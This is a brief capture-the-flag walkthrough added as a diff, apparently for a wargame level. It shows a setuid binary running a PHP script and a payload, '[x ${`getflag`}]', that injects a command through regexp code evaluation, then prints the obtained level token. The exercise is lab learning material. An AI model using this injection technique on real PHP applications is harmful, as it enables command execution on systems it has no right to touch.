@@ -1,0 +1,20 @@
+
+->ls -la
+
+we find two interesting lines :
+
+-rwsr-x---+ 1 flag06 level06 ... level06
+-rwsr-x---  1 flag06 level06 ... level06.php
+
+-> cat level06.php
+
+---- faire ça à nouveau pour copier code PHP -----
+
+-> echo '[x ${`getflag`}]' > /tmp/getflag
+
+-> ./level06 /tmp/getflag
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+in /home/user/level06/level06.php(4) : regexp code on line 1
+
+-> su level07 ..
